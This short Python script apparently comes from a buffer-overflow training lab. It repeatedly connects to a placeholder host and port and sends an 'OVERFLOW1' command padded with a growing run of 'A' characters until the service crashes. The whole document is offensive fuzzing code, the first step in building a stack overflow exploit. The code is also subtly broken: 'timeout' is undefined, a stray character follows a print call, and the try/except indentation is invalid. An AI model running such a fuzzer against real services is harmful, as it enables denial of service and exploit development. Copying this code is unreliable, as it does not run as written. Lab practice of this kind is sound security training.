#!/usr/bin/env python3

import socket
import time
import sys

ip = "<target>"
port = <port>
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print(f"Fuzzing with {len(string) - len(prefix)} bytes")
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
        except:
            print(f"Fuzzing crashed at {len(string) - len(prefix)} bytes")i
            sys.exit(0)
        string += 100 * "A"
        time.sleep(1)
